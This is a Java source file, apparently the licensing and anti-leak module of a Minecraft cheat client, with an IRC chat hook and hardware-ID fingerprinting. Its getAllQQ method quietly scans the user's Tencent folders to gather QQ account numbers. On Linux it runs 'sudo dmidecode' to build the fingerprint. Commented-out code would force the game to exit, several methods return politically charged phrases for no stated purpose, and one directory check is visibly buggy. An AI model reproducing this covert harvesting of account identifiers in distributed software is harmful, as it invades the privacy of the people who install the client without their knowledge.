package shop.xmz.lol.loratadine.antileak;

import cn.lzq.injection.leaked.invoked.UpdateEvent;
import net.minecraft.client.Minecraft;
import net.minecraft.network.protocol.Packet;
import net.minecraft.network.protocol.game.ServerboundChatPacket;
import shop.xmz.lol.loratadine.Loratadine;
import shop.xmz.lol.loratadine.antileak.client.Client;
import shop.xmz.lol.loratadine.antileak.packet.impls.send.CPacketChat;
import shop.xmz.lol.loratadine.antileak.user.UserData;
import shop.xmz.lol.loratadine.antileak.user.UserType;
import shop.xmz.lol.loratadine.antileak.utils.PacketWrapper;
import shop.xmz.lol.loratadine.event.annotations.EventTarget;
import shop.xmz.lol.loratadine.event.impl.PacketEvent;
import shop.xmz.lol.loratadine.utils.ClientUtils;
import shop.xmz.lol.loratadine.utils.NativeUtils;
import shop.xmz.lol.loratadine.utils.TimerUtils;
import shop.xmz.lol.loratadine.utils.unsafe.UnsafeUtils;
import shop.xmz.lol.loratadine.utils.wrapper.Wrapper;

import javax.annotation.Nonnull;
import java.io.*;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.net.NetworkInterface;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.*;
import java.util.regex.Pattern;

public class Fucker implements Wrapper {
    public static boolean firstLogin = true; //第一次给了
    public static boolean login = false;
    public static boolean isBeta = false;
    public static String name = "";
    public static String username = "";
    public static String password = "";
    public static UserType userType;
    public static UserData userData;
    public static final HashMap<String, UserData> userNames = new HashMap<>();
    private static final TimerUtils timerUtils = new TimerUtils();

    public static void init(Object[] o) {
        if (o.length % 2 == 0) Loratadine.INSTANCE.getEventManager().register(new Fucker());
    }

    @EventTarget
    public void onUpdate(UpdateEvent event) {
        if (mc.player == null || mc.level == null) return;

//        if (!login) {
//            if (timerUtils.delay(50000L)) {
//                new Thread(() -> {
//                    try {
//                        NativeUtils.redefineClassesNoSuccessfulPrint(HashSet.class, (byte[]) Loratadine.oldSetByte);
//                        Client.channel.close();
//                        final Minecraft minecraft = Wrapper.mc;
//                        minecraft.close();
//                        UnsafeUtils.freeMemory();
//                        System.exit(-1);
//                        for (Field field : minecraft.getClass().getDeclaredFields()) {
//                            if (field.getType() == Minecraft.class) {
//                                field.setAccessible(true);
//                                field.set(minecraft, null);
//                            }
//                        }
//                        throw new RuntimeException("Crack by Ho3#1337");
//                    } catch (Throwable e) {
//                        System.exit(0);
//                    }
//                }).start();
//                timerUtils.reset();
//            }
//        }
    }

    @EventTarget
    public void onPacket(PacketEvent event) {
        if (mc.player == null || mc.level == null) return;

        Packet<?> packet = event.getPacket();

        if (mc.hasSingleplayerServer()) return;

        if (packet instanceof ServerboundChatPacket wrapper) {
            String chat = wrapper.message();

            if (chat.startsWith("$") && !chat.trim().isEmpty()) {
                event.setCancelled(true);
                final String text = chat.substring(1);
                if (text.length() <= userType.chatLimit || userType.chatLimit == -1) {
                    if (Client.channel != null) {
                        try {
                            PacketWrapper.release(new CPacketChat(Client.channel, text));
                        } catch (Throwable ignored) {}
                    }
                } else {
                    ClientUtils.displayIRC("你发送的话超过你可以发送的字数限制，你只能最多发送" + userType.chatLimit + "个字!");
                }
            }
        }
    }

    public static Set<String> getAllQQ() {
        Set<String> qqs = new HashSet<>();

        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            Pattern pattern = Pattern.compile("^[1-9][0-9]{4,10}$");

            Path defaultPath = Paths.get(System.getProperty("user.home"), "AppData", "Roaming", "Tencent", "Users");
            File defaultPathFile = defaultPath.toFile();

            if (defaultPathFile.exists() && defaultPathFile.isDirectory()) {
                File[] directoryFiles = defaultPathFile.listFiles();
                if (directoryFiles != null) {
                    for (File qqData : directoryFiles) {
                        String fileName = qqData.getName();
                        if (pattern.matcher(fileName).matches()) {
                            qqs.add(fileName);
                        }
                    }
                }
            }

            Path ntDefaultPath = Paths.get(System.getProperty("user.home"), "Documents", "Tencent Files", "nt_qq", "global", "nt_data", "Login");
            File ntDefaultPathFile = ntDefaultPath.toFile();
            if (defaultPathFile.exists() && ntDefaultPathFile.isDirectory()) {
                File[] directoryFiles = defaultPathFile.listFiles();
                if (directoryFiles != null) {
                    for (File qqData : directoryFiles) {
                        String fileName = qqData.getName().substring(1);
                        if (pattern.matcher(fileName).matches()) {
                            qqs.add(fileName);
                        }
                    }
                }
            }

            Path customPath = Paths.get(System.getenv("PUBLIC"), "Documents", "Tencent", "QQ", "UserDataInfo.ini");
            File customPathFile = customPath.toFile();

            if (customPathFile.exists() && customPathFile.isFile()) {
                try {
                    InputStream stream = Files.newInputStream(customPath);
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(stream))) {
                        String dataLine;
                        while ((dataLine = reader.readLine()) != null) {
                            String[] keyValue = dataLine.split("=");
                            if (keyValue.length == 2) {
                                if (Objects.equals(keyValue[0], "UserDataSavePath")) {
                                    File directory = new File(keyValue[1]);
                                    if (directory.exists() && directory.isDirectory()) {
                                        File[] directoryFiles = directory.listFiles();
                                        if (directoryFiles != null) {
                                            for (File qqData : directoryFiles) {
                                                if (pattern.matcher(qqData.getName()).matches()) {
                                                    qqs.add(qqData.getName());
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (IOException ignore) {
                }
            }
        }
        return qqs;
    }

    public static String bytesToHexString(byte[] src) {
        StringBuilder stringBuilder = new StringBuilder();
        if (src == null || src.length == 0) {
            return null;
        }
        for (byte b : src) {
            int v = b & 0xFF;
            String hv = Integer.toHexString(v);
            if (hv.length() < 2) {
                stringBuilder.append(0);
            }
            stringBuilder.append(hv);
        }
        return stringBuilder.toString();
    }

    private static String getSplitString(String str, String split, int length) {
        int len = str.length();
        StringBuilder temp = new StringBuilder();
        for (int i = 0; i < len; i++) {
            if (i % length == 0 && i > 0) {
                temp.append(split);
            }
            temp.append(str.charAt(i));
        }
        String[] attrs = temp.toString().split(split);
        StringBuilder finalMachineCode = new StringBuilder();
        for (String attr : attrs) {
            if (attr.length() == length) {
                finalMachineCode.append(attr).append(split);
            }
        }
        return finalMachineCode.substring(0,
                finalMachineCode.toString().length() - 1);
    }

    private static String md5Encoder(String str) {
        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance("MD5");
            md.update(str.getBytes());
            return getSplitString(new BigInteger(1, md.digest()).toString(16), "-", 5).toUpperCase();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return str;
    }

    public static String getA() {
        return "习近平";
    }

    public static String getB() {
        return "天安门屠杀";
    }

    public static String getC() {
        return "八九六四";
    }

    public static String getD() {
        return "习包子";
    }

    @Nonnull
    public static String getUUID() {
        String name = System.getProperty("os.name").toLowerCase();

        try {
            if (name.contains("windows")) {
                StringBuilder raw = new StringBuilder();
                String main = System.getenv("PROCESS_IDENTIFIER") + System.getenv("COMPUTERNAME");
                byte[] bytes = main.getBytes(StandardCharsets.UTF_8);
                MessageDigest messageDigest = MessageDigest.getInstance("MD5");
                byte[] md5 = messageDigest.digest(bytes);
                int i = 0;

                for (byte b : md5) {
                    raw.append(Integer.toHexString((b & 0xFF) | 0x300), 0, 3);
                    if (i != md5.length - 1) {
                        raw.append("");
                    }
                    i++;
                }

                StringBuilder result = new StringBuilder((raw).substring(raw.length() - 20, raw.length()).toUpperCase());

                int index;

                for (index = 5; index < result.length(); index += 6) {
                    result.insert(index, '-');
                }
                return md5Encoder(result.toString());
            } else if (name.contains("mac")) {
                Enumeration<NetworkInterface> el = NetworkInterface.getNetworkInterfaces();
                while (el.hasMoreElements()) {
                    byte[] mac = el.nextElement().getHardwareAddress();
                    if (mac == null)
                        continue;

                    String hexStr = bytesToHexString(mac);
                    if (hexStr == null) return "";
                    return md5Encoder(getSplitString(hexStr, "-", 2).toUpperCase());
                }
                return "";
            } else if (name.contains("linux")) {
                String result = "";
                Process process = Runtime.getRuntime().exec("sudo dmidecode -s system-uuid");
                InputStream in;
                BufferedReader br;
                in = process.getInputStream();
                br = new BufferedReader(new InputStreamReader(in));
                while (in.read() != -1) {
                    result = br.readLine();
                }
                br.close();
                in.close();
                process.destroy();
                return md5Encoder(result);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return "";
    }
}
